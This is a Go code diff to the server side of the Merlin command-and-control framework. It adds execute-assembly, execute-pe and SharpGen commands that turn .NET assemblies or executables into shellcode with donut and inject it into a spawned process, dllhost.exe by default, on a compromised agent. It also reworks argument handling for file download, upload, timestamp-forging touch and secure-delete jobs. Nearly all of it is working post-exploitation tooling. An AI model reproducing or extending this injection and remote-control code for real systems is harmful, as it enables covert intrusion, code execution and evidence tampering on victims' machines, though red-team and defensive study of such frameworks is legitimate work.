@@ -19,37 +19,35 @@ package agents
 
 import (
 	// Standard
+	"encoding/base64"
 	"fmt"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 
 	// 3rd Party
-	"github.com/mattn/go-shellwords"
 	uuid "github.com/satori/go.uuid"
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg/agents"
 	"github.com/Ne0nd0g/merlin/pkg/api/messages"
+	"github.com/Ne0nd0g/merlin/pkg/core"
+	"github.com/Ne0nd0g/merlin/pkg/modules/donut"
+	"github.com/Ne0nd0g/merlin/pkg/modules/sharpgen"
 	"github.com/Ne0nd0g/merlin/pkg/modules/shellcode"
+	"github.com/Ne0nd0g/merlin/pkg/modules/winapi/createprocess"
 )
 
 // CD is used to change the agent's current working directory
 func CD(agentID uuid.UUID, Args []string) messages.UserMessage {
+	var args []string
 	if len(Args) > 1 {
-		arg := strings.Join(Args[0:], " ")
-		argS, errS := shellwords.Parse(arg)
-		if errS != nil {
-			m := fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", Args, errS.Error())
-			return messages.ErrorMessage(m)
-		}
-		job, err := agents.AddJob(agentID, "cd", argS)
-		if err != nil {
-			return messages.ErrorMessage(err.Error())
-		}
-		return messages.JobMessage(agentID, job)
+		args = []string{Args[1]}
+	} else {
+		return messages.ErrorMessage("a directory path must be provided")
 	}
-	job, err := agents.AddJob(agentID, "cd", Args)
+	job, err := agents.AddJob(agentID, "cd", args)
 	if err != nil {
 		return messages.ErrorMessage(err.Error())
 	}
@@ -110,22 +108,137 @@ func WinExec(agentID uuid.UUID, Args []string) messages.UserMessage {
 // Args[1] = file path to download
 func Download(agentID uuid.UUID, Args []string) messages.UserMessage {
 	if len(Args) >= 2 {
-		arg := strings.Join(Args[1:], " ")
-		argS, errS := shellwords.Parse(arg)
-		if errS != nil {
-			m := fmt.Sprintf("there was an error parsing command line argments: %s\r\n%s",
-				Args[1:], errS.Error())
-			return messages.ErrorMessage(m)
+		job, err := agents.AddJob(agentID, "download", []string{Args[1]})
+		if err != nil {
+			return messages.ErrorMessage(err.Error())
 		}
-		if len(argS) >= 1 {
-			job, err := agents.AddJob(agentID, "download", argS[0:1])
-			if err != nil {
-				return messages.ErrorMessage(err.Error())
-			}
-			return messages.JobMessage(agentID, job)
-		}
+		return messages.JobMessage(agentID, job)
 	}
 	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Download call: %s", Args))
+}
+
+// ExecuteAssembly calls the donut module to create shellcode from a .NET 4.0 assembly and then uses the CreateProcess
+// module to create a job that executes the shellcode in a remote process
+func ExecuteAssembly(agentID uuid.UUID, Args []string) messages.UserMessage {
+
+	// Set the assembly filepath
+	var assembly string
+	if len(Args) > 1 {
+		assembly = Args[1]
+	} else {
+		return messages.ErrorMessage("the .NET assembly file path was not provided for execute-assembly")
+	}
+
+	// Set the assembly arguments, if any
+	// File path is checked in the donut module
+	var params string
+	if len(Args) > 2 {
+		params = Args[2]
+	}
+
+	// Set the SpawnTo path
+	options := make(map[string]string)
+	if len(Args) > 3 {
+		options["spawnto"] = Args[3]
+	} else {
+		options["spawnto"] = "C:\\WIndows\\System32\\dllhost.exe"
+	}
+
+	// Set the SpawnTo arguments, if any
+	if len(Args) > 4 {
+		options["args"] = Args[4]
+	} else {
+		options["args"] = ""
+	}
+
+	// Build Donut Config
+	config := donut.GetDonutDefaultConfig()
+	config.DotNetMode = true
+	config.ExitOpt = 2
+	config.Type = 2 //DONUT_MODULE_NET_EXE = 2; .NET EXE. Executes Main if no class and method provided
+	config.Runtime = "v4.0.30319"
+	config.Entropy = 3
+	config.Parameters = params
+
+	// Convert assembly into shellcode with donut
+	donutBuffer, err := donut.BytesFromConfig(assembly, config)
+	if err != nil {
+		return messages.ErrorMessage(fmt.Sprintf("error turning assembly into shellcode bytes with donut:\r\n%s", err))
+	}
+	options["shellcode"] = base64.StdEncoding.EncodeToString(donutBuffer.Bytes())
+
+	//Get CreateProcess job
+	j, err := createprocess.Parse(options)
+	if err != nil {
+		return messages.ErrorMessage(fmt.Sprintf("error generating a CreateProcess job:\r\n%s", err))
+	}
+
+	// Add job to the Agent's queue
+	job, err := agents.AddJob(agentID, j[0], j[1:])
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
+}
+
+// ExecutePE calls the donut module to create shellcode from PE and then uses the CreateProcess
+// module to create a job that executes the shellcode in a remote process
+func ExecutePE(agentID uuid.UUID, Args []string) messages.UserMessage {
+
+	// Set the assembly filepath
+	var pe string
+	if len(Args) > 1 {
+		pe = Args[1]
+	} else {
+		return messages.ErrorMessage("the PE file path was not provided for execute-pe")
+	}
+
+	// Set the assembly arguments, if any
+	// File path is checked in the donut module
+	var params string
+	if len(Args) > 2 {
+		params = Args[2]
+	}
+
+	// Set the SpawnTo path
+	options := make(map[string]string)
+	if len(Args) > 3 {
+		options["spawnto"] = Args[3]
+	} else {
+		options["spawnto"] = "C:\\WIndows\\System32\\dllhost.exe"
+	}
+
+	// Set the SpawnTo arguments, if any
+	if len(Args) > 4 {
+		options["args"] = Args[4]
+	} else {
+		options["args"] = ""
+	}
+
+	// Build Donut Config
+	config := donut.GetDonutDefaultConfig()
+	config.ExitOpt = 2
+	config.Parameters = params
+
+	// Convert assembly into shellcode with donut
+	donutBuffer, err := donut.BytesFromConfig(pe, config)
+	if err != nil {
+		return messages.ErrorMessage(fmt.Sprintf("error turning pe into shellcode bytes with donut:\r\n%s", err))
+	}
+	options["shellcode"] = base64.StdEncoding.EncodeToString(donutBuffer.Bytes())
+
+	//Get CreateProcess job
+	j, err := createprocess.Parse(options)
+	if err != nil {
+		return messages.ErrorMessage(fmt.Sprintf("error generating a CreateProcess job:\r\n%s", err))
+	}
+
+	// Add job to the Agent's queue
+	job, err := agents.AddJob(agentID, j[0], j[1:])
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
 }
 
 // ExecuteShellcode calls the corresponding shellcode module to create a job that executes the provided shellcode
@@ -232,20 +345,11 @@ func Kill(agentID uuid.UUID, Args []string) messages.UserMessage {
 
 // LS uses native Go to list the directory
 func LS(agentID uuid.UUID, Args []string) messages.UserMessage {
+	var args []string
 	if len(Args) > 1 {
-		arg := strings.Join(Args[0:], " ")
-		argS, errS := shellwords.Parse(arg)
-		if errS != nil {
-			m := fmt.Sprintf("there was an error parsing command line argments: %s\r\n%s", Args, errS.Error())
-			return messages.ErrorMessage(m)
-		}
-		job, err := agents.AddJob(agentID, "ls", argS)
-		if err != nil {
-			return messages.ErrorMessage(err.Error())
-		}
-		return messages.JobMessage(agentID, job)
+		args = []string{Args[1]}
 	}
-	job, err := agents.AddJob(agentID, "ls", Args)
+	job, err := agents.AddJob(agentID, "ls", args)
 	if err != nil {
 		return messages.ErrorMessage(err.Error())
 	}
@@ -275,11 +379,10 @@ func Netstat(agentID uuid.UUID, Args []string) messages.UserMessage {
 // Args[0] = "nslookup"
 // Args[1] = query (string of either IP or hostname)
 func Nslookup(agentID uuid.UUID, Args []string) messages.UserMessage {
-	ArgsArray, err := shellwords.Parse(strings.Join(Args, " "))
-	if len(ArgsArray) != 2 {
+	if len(Args) != 2 {
 		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent Nslookup call: %s", Args))
 	}
-	job, err := agents.AddJob(agentID, "nslookup", Args)
+	job, err := agents.AddJob(agentID, "nslookup", []string{Args[1]})
 	if err != nil {
 		return messages.ErrorMessage(err.Error())
 	}
@@ -305,14 +408,13 @@ func PWD(agentID uuid.UUID, Args []string) messages.UserMessage {
 }
 
 // SecureDelete is used to delete, potentially large files, with random data
-// ArgsArray[0] = "sdelete"
-// ArgsArray[1] = target file
+// args[0] = "sdelete"
+// args[1] = target file
 func SecureDelete(agentID uuid.UUID, Args []string) messages.UserMessage {
-	ArgsArray, err := shellwords.Parse(strings.Join(Args, " "))
-	if err != nil || len(ArgsArray) != 2 {
+	if len(Args) != 2 {
 		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent SecureDelete call: %s", Args))
 	}
-	job, err := agents.AddJob(agentID, "sdelete", ArgsArray)
+	job, err := agents.AddJob(agentID, "sdelete", []string{strings.Join(Args[1:], " ")})
 	if err != nil {
 		return messages.ErrorMessage(err.Error())
 	}
@@ -485,17 +587,74 @@ func SetSleep(agentID uuid.UUID, Args []string) messages.UserMessage {
 }
 
 // Touch is used make the destination file's last accessed and last modified times match the source file
-// ArgsArray[0] = "touch"
-// ArgsArray[1] = source file
-// ArgsArray[2] = dest file
+// args[0] = "touch"
+// args[1] = source file
+// args[2] = dest file
 func Touch(agentID uuid.UUID, Args []string) messages.UserMessage {
-	Args[0] = "touch"
-	ArgsArray, err := shellwords.Parse(strings.Join(Args, " "))
-	if err != nil || len(ArgsArray) != 3 {
+	if len(Args) != 3 {
 		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent Touch call: %s", Args))
 	}
 
-	job, err := agents.AddJob(agentID, "touch", ArgsArray)
+	job, err := agents.AddJob(agentID, "touch", Args[1:])
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
+}
+
+// SharpGen generates a .NET core assembly, converts it to shellcode with go-donut, and executes it in the spawnto process
+func SharpGen(agentID uuid.UUID, Args []string) messages.UserMessage {
+	// Set the assembly filepath
+	options := make(map[string]string)
+
+	if len(Args) > 1 {
+		options["code"] = fmt.Sprintf("Console.WriteLine(%s);", Args[1])
+	} else {
+		return messages.ErrorMessage("code must be provided for the SharpGen module")
+	}
+
+	// Set the SpawnTo path
+
+	if len(Args) > 2 {
+		options["spawnto"] = Args[2]
+	} else {
+		options["spawnto"] = "C:\\WIndows\\System32\\dllhost.exe"
+	}
+
+	// Set the SpawnTo arguments, if any
+	if len(Args) > 3 {
+		options["args"] = Args[3]
+	} else {
+		options["args"] = ""
+	}
+
+	// Set SharpGen Module Parse() options
+	options["dotnetbin"] = "dotnet"
+	options["sharpgenbin"] = filepath.Join(core.CurrentDir, "data", "src", "cobbr", "SharpGen", "bin", "release", "netcoreapp2.1", "SharpGen.dll")
+	options["help"] = "false"
+	options["file"] = filepath.Join(core.CurrentDir, "sharpgen.exe")
+	options["dotnet"] = ""
+	options["output-kind"] = ""
+	options["platform"] = ""
+	options["no-optimization"] = "false"
+	options["assembly-name"] = ""
+	options["source-file"] = ""
+	options["class-name"] = ""
+	options["confuse"] = ""
+
+	if core.Verbose {
+		options["verbose"] = "true"
+	} else {
+		options["verbose"] = "false"
+	}
+
+	j, err := sharpgen.Parse(options)
+	if err != nil {
+		return messages.ErrorMessage(fmt.Sprintf("there was an error using the SharpGen module:\r\n%s", err))
+	}
+
+	// Add job to the Agent's queue
+	job, err := agents.AddJob(agentID, j[0], j[1:])
 	if err != nil {
 		return messages.ErrorMessage(err.Error())
 	}
@@ -504,25 +663,21 @@ func Touch(agentID uuid.UUID, Args []string) messages.UserMessage {
 
 // Upload transfers a file from the Merlin Server to the Agent
 func Upload(agentID uuid.UUID, Args []string) messages.UserMessage {
+	// Make sure there are enough arguments
+	// Validate the source file exists
+	// Create job
 	if len(Args) >= 3 {
-		arg := strings.Join(Args[1:], " ")
-		argS, errS := shellwords.Parse(arg)
-		if errS != nil {
-			m := fmt.Sprintf("there was an error parsing command line argments: %s\r\n%s", Args, errS.Error())
+		_, errF := os.Stat(Args[1])
+		if errF != nil {
+			m := fmt.Sprintf("there was an error accessing the source upload file:\r\n%s", errF.Error())
 			return messages.ErrorMessage(m)
 		}
-		if len(argS) >= 2 {
-			_, errF := os.Stat(argS[0])
-			if errF != nil {
-				m := fmt.Sprintf("there was an error accessing the source upload file:\r\n%s", errF.Error())
-				return messages.ErrorMessage(m)
-			}
-			job, err := agents.AddJob(agentID, "upload", argS[0:2])
-			if err != nil {
-				return messages.ErrorMessage(err.Error())
-			}
-			return messages.JobMessage(agentID, job)
+		job, err := agents.AddJob(agentID, "upload", Args[1:3])
+		if err != nil {
+			return messages.ErrorMessage(err.Error())
 		}
+		return messages.JobMessage(agentID, job)
+
 	}
 	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Upload call: %s", Args))
 }
